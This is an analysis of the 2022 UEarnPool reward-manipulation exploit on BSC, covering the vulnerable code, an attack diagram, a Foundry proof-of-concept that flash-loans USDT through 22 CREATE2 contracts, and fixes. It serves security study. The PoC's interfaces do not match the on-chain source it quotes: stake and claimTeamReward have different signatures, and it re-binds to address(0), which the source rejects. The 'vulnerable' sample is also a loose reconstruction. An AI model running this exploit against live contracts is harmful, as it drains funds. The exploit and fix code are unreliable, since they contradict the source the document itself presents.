# UEarnPool — claimTeamReward() + CREATE2 Chain Staking Reward Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | UEarnPool |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~$2,420,000 USDT |
| **Vulnerable Contract** | [0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c](https://bscscan.com/address/0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c) (UEarnPool) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **LP Pair (Flash Loan)** | [0x7EFaEf62fDdCCa950418312c6C91Aef321375A00](https://bscscan.com/address/0x7EFaEf62fDdCCa950418312c6C91Aef321375A00) |
| **Root Cause** | `claimTeamReward()` reward calculation logic fails to properly validate team staking amounts, enabling excess reward extraction via a CREATE2 hierarchy |
| **CWE** | CWE-682: Incorrect Calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/UEarnPool_exp.sol) |

---
## 1. Vulnerability Overview

UEarnPool is a staking protocol with a team-based reward structure, where the `claimTeamReward()` function paid out rewards based on the aggregated staking amounts of team members. The attacker deployed 22 contracts in a hierarchical structure using CREATE2 and bound each contract as the referrer of the previous one. The attacker flash-loaned 2,420,000 USDT from PancakeSwap, staked the maximum amount in the lowest-tier contract so that the top-tier contract satisfied the Tier 3 threshold, and then sequentially staked small amounts and called `claimTeamReward()` from each contract. Because the reward calculation did not properly validate the cumulative team amount, excess rewards were paid out at every step.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable claimTeamReward() - team staking amount validation error
contract UEarnPool {
    struct User {
        address referrer;
        uint256 stakedAmount;
        uint256 teamAmount;   // aggregate staking of the entire team
        uint256 tier;         // tier based on team size
    }

    mapping(address => User) public users;

    function bindInvitor(address invitor) external {
        require(users[msg.sender].referrer == address(0), "Already bound");
        users[msg.sender].referrer = invitor;
    }

    function stake(uint256 amount) external {
        USDT.transferFrom(msg.sender, address(this), amount);
        users[msg.sender].stakedAmount += amount;

        // Update teamAmount for upstream referrers
        address ref = users[msg.sender].referrer;
        while (ref != address(0)) {
            users[ref].teamAmount += amount;
            ref = users[ref].referrer;
        }
    }

    // ❌ Vulnerable reward calculation - insufficient teamAmount validation
    function claimTeamReward() external {
        User storage user = users[msg.sender];

        // ❌ Only checks current teamAmount; does not track changes since last claim
        uint256 rewardableTier = _getTier(user.teamAmount);

        // ❌ Does not calculate the increment relative to the already-claimed amount;
        // after artificially satisfying teamAmount via a CREATE2 hierarchy,
        // repeated claims are possible from each contract
        uint256 reward = _calculateTierReward(rewardableTier, user.stakedAmount);
        USDT.transfer(msg.sender, reward);
    }
}

// ✅ Correct pattern - increment-based reward tracking
contract SafeUEarnPool {
    mapping(address => uint256) public lastClaimedTeamAmount;

    function claimTeamReward() external {
        User storage user = users[msg.sender];
        uint256 currentTeamAmount = user.teamAmount;
        uint256 lastClaimed = lastClaimedTeamAmount[msg.sender];

        // ✅ Reward calculated only on the increment since the last claim
        require(currentTeamAmount > lastClaimed, "No new team amount");
        uint256 increment = currentTeamAmount - lastClaimed;

        lastClaimedTeamAmount[msg.sender] = currentTeamAmount;
        uint256 reward = _calculateIncrementalReward(increment);
        USDT.transfer(msg.sender, reward);
    }
}
```


### On-Chain Source Code

Source: **Sourcify partial-match** — UEarnPool.sol / `0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c` (BSC)
https://sourcify.dev/server/files/any/56/0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c

```solidity
// ── bindInvitor ──────────────────────────────────────────────────────────────
function bindInvitor(address invitor) external {
    address account = msg.sender;
    require(invitor != account, "self");
    require(address(0) != invitor, "invitor 0");
    require(address(0) == _invitor[account], "Bind");
    require(!_userInfos[account].active, "active");
    require(_binder[account].length == 0, "had binders");
    _invitor[account] = invitor;
    _binder[invitor].push(account);
    uint256 len = _inviteLength;
    for (uint256 i; i < len;) {
        if (address(0) == invitor) { break; }
        _userInfos[invitor].teamAccount += 1;
        invitor = _invitor[invitor];
        unchecked { ++i; }
    }
}

// ── stake ────────────────────────────────────────────────────────────────────
function stake(uint256 pid, uint256 amount) external {
    require(!_pause, "Pause");
    uint256 unit = _amountUnit;
    amount = amount / unit * unit;
    require(amount >= _minAmount, "<min");
    address account = msg.sender;
    Pool storage pool = _pools[pid];
    pool.totalAmount += amount;
    uint256 reward    = amount * pool.rewardRate / _feeDivFactor;
    uint256 feeAmount = amount * _feeRate      / _feeDivFactor;
    _userRecords[account].push(
        Record(pid, amount, feeAmount, reward, block.timestamp, block.timestamp + pool.duration, 0)
    );
    UserInfo storage userInfo = _userInfos[account];
    userInfo.amount += amount;
    if (!userInfo.active) { userInfo.active = true; }
    IERC20(_tokenAddress).transferFrom(account, address(this), amount);
    _addInviteReward(account, amount);
    _addTeamAmount(account, amount);  // ← propagates stake upward through referrer chain
}

// ── _addTeamAmount ───────────────────────────────────────────────────────────
// Called on every stake() to accumulate teamAmount for all upstream referrers.
function _addTeamAmount(address account, uint256 amount) private {
    uint256 teamLength = _teamLength;
    for (uint256 i; i < teamLength;) {
        address invitor = _invitor[account];
        if (address(0) == invitor) { break; }
        account = invitor;
        unchecked {
            _userInfos[invitor].teamAmount += amount;  // ← grows every time a downstream node stakes
            ++i;
        }
    }
}

// ── claimTeamReward ──────────────────────────────────────────────────────────
// ❌ Pays out a fixed USDT reward for each tier threshold that teamAmount crosses.
//    The reward for tier i is determined once: if levelClaimed[i] == 0 it is paid
//    and set. It is NOT recalculated relative to how much the caller personally staked.
function claimTeamReward(address account) external {
    uint256 level = getUserLevel(account);      // ❌ derived from current teamAmount
    uint256 pendingReward;
    uint256 levelReward;
    if (level != MAX) {
        for (uint256 i; i <= level;) {
            LevelConfig storage levelConfig = _levelConfigs[i];
            if (_userInfos[account].levelClaimed[i] == 0) {  // ❌ only checks "never claimed"
                if (i == 0) {
                    levelReward = levelConfig.teamAmount * levelConfig.rewardRate / _feeDivFactor;
                } else {
                    // ❌ reward = (thisLevelThreshold − prevLevelThreshold) × rate
                    // This is a fixed payout per level, not proportional to actual stake contributed.
                    levelReward = (levelConfig.teamAmount - _levelConfigs[i - 1].teamAmount)
                                  * levelConfig.rewardRate / _feeDivFactor;
                }
                pendingReward += levelReward;
                _userInfos[account].levelClaimed[i] = levelReward;
            }
            unchecked { ++i; }
        }
    }
    if (pendingReward > 0) {
        IERC20(_tokenAddress).transfer(account, pendingReward);
    }
}
```

**Why it is exploitable (identify the bug from the code):**
- `_addTeamAmount` propagates every stake upward through `_teamLength` levels unconditionally. A 22-level CREATE2 hierarchy means C[0]'s `teamAmount` grows by the entire bottom-node stake — making C[0] (and every intermediate node) appear to meet the highest tier threshold.
- `claimTeamReward` pays a **fixed USDT reward per level tier** (based on the tier threshold amounts, not on the caller's own stake). The only guard is `levelClaimed[i] == 0` — claimed once → never again. This is per address, so 22 separate contracts each claim once.
- The attacker flash-loans USDT, stakes it all at C[21] to inflate `teamAmount` for all 22 nodes, then iterates: `stake(small) → claimTeamReward()` for each node. Because each node is a separate contract, each gets its own `levelClaimed[i] == 0` check, each pays the full fixed tier reward.
- The reward paid per node far exceeds the small stake deposited, so 22 × fixed-tier-reward >> 22 × small-stake + flash-loan-fee.

```solidity
// ✅ Fix: tie reward to the caller's own staked amount, not a fixed tier payout
function claimTeamReward(address account) external {
    UserInfo storage userInfo = _userInfos[account];
    uint256 level = getUserLevel(account);
    require(level != MAX, "No level");
    // ✅ Reward proportional to caller's actual stake, capped at their tier multiplier
    uint256 eligibleReward = userInfo.amount
        * _levelConfigs[level].rewardRate / _feeDivFactor;
    // ✅ Subtract already-claimed amount; track per-account cumulative
    uint256 alreadyClaimed = userInfo.totalTeamRewardClaimed;
    require(eligibleReward > alreadyClaimed, "Nothing to claim");
    uint256 toPay = eligibleReward - alreadyClaimed;
    userInfo.totalTeamRewardClaimed = eligibleReward;
    IERC20(_tokenAddress).transfer(account, toPay);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Deploy 22 contracts via CREATE2
    │       C[0] ← C[1] ← C[2] ← ... ← C[21]
    │       Each contract bound as the referrer of the previous one
    │
    ├─[2] Flash loan 2,420,000 USDT from PancakeSwap LP
    │       Enter pancakeCall() callback
    │
    ├─[3] Stake maximum USDT in C[21] (lowest tier)
    │       → teamAmount of C[0]~C[20] satisfies Tier 3 threshold
    │
    ├─[4] Sequential staking + reward claims:
    │       C[0].stake(small amount) → C[0].claimTeamReward() ← excess reward
    │       C[1].stake(small amount) → C[1].claimTeamReward() ← excess reward
    │       ...
    │       C[21].stake(small amount) → C[21].claimTeamReward() ← excess reward
    │       ❌ Insufficient team amount validation at each step leads to excess reward payout
    │
    ├─[5] Collect accumulated USDT rewards
    │
    ├─[6] Repay PancakeSwap flash loan (+ fee)
    │
    └─[7] Net profit: excess reward USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IUEarnPool {
    function bindInvitor(address invitor) external;
    function stake(uint256 amount) external;
    function claimTeamReward() external;
    function withdraw(uint256 amount) external;
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Hierarchical staking contract deployed via CREATE2
contract StakeNode {
    IUEarnPool pool;
    address owner;
    IERC20 USDT;

    constructor(address _pool, address _usdt) {
        pool = IUEarnPool(_pool);
        owner = msg.sender;
        USDT = IERC20(_usdt);
    }

    function bindAndStake(address invitor, uint256 amount) external {
        require(msg.sender == owner);
        pool.bindInvitor(invitor);
        USDT.approve(address(pool), type(uint256).max);
        if (amount > 0) pool.stake(amount);
    }

    function claim() external {
        require(msg.sender == owner);
        pool.claimTeamReward();
        // Transfer USDT to owner
        USDT.transfer(owner, USDT.balanceOf(address(this)));
    }
}

contract UEarnPoolExploit is Test {
    IUEarnPool pool = IUEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    IPancakePair flashPair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    StakeNode[22] nodes;

    function setUp() public {
        vm.createSelectFork("bsc", 23_120_167);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);

        // [Step 1] Deploy 22 nodes via CREATE2
        for (uint256 i = 0; i < 22; i++) {
            bytes32 salt = bytes32(i);
            nodes[i] = new StakeNode{salt: salt}(address(pool), address(USDT));
        }

        // [Step 2] Flash loan from PancakeSwap
        flashPair.swap(2_420_000 * 1e18, 0, address(this), abi.encode(true));

        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 3] Set up hierarchical binding
        // C[0] is the top tier, C[21] is the bottom tier
        for (uint256 i = 0; i < 22; i++) {
            address invitor = i == 0 ? address(this) : address(nodes[i-1]);
            USDT.transfer(address(nodes[i]), 100 * 1e18);
            nodes[i].bindAndStake(invitor, 0);
        }

        // Stake large amount in the bottom node → satisfies Tier 3 teamAmount for all nodes
        USDT.transfer(address(nodes[21]), amount * 90 / 100);
        nodes[21].bindAndStake(address(nodes[20]), amount * 90 / 100);

        // [Step 4] Sequential staking + reward claims from each node
        for (uint256 i = 0; i < 22; i++) {
            USDT.transfer(address(nodes[i]), 1000 * 1e18);
            nodes[i].bindAndStake(address(0), 1000 * 1e18);
            // ⚡ Excess reward due to insufficient team amount validation
            nodes[i].claim();
        }

        // [Step 5] Repay flash loan
        USDT.transfer(address(flashPair), amount * 1003 / 1000 + 1);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | claimTeamReward() team amount validation error + CREATE2 hierarchy |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Reward Manipulation Attack |
| **Attack Vector** | PancakeSwap flash loan → 22-level CREATE2 hierarchy → large stake at bottom node → `claimTeamReward()` on each node |
| **Preconditions** | `claimTeamReward()` reward calculation based on current teamAmount rather than increments; manipulable via CREATE2 hierarchy |
| **Impact** | ~$2,420,000 USDT loss |

---
## 6. Remediation Recommendations

1. **Increment-based reward tracking**: Record the `teamAmount` at the time of the last claim and calculate rewards only on the increase since then.
2. **Limit team depth/structure**: Cap the maximum depth of the hierarchy and the number of allowed referrals per level.
3. **Defend against CREATE2 hierarchies**: When binding a referrer, verify that `msg.sender` is an EOA (`tx.origin == msg.sender`), or block contract addresses from registering as referrers.
4. **Flash loan defense**: Require a minimum number of blocks to elapse between staking and claiming rewards.

---
## 7. Lessons Learned

- **Vulnerability of team reward structures**: Multi-level referral reward systems (MLM-style structures) are susceptible to hierarchical manipulation attacks. The pattern of flash-loaning temporary funds to satisfy team thresholds, collecting rewards, and then returning the funds recurs across many team-reward protocols.
- **Increment-based vs. total-based rewards**: Calculating rewards based on the total `teamAmount` allows flash loans to momentarily inflate `teamAmount`. Only the increment since the last claim should be used as the reward basis.
- **CREATE2 + hierarchy attacks**: UEarnPool (22 contracts), VTF (400 contracts), and RL (100 contracts) all suffered multi-contract hierarchy attacks using CREATE2. When designing on-chain protocols, every code path that allows contract addresses to participate must be explicitly blocked.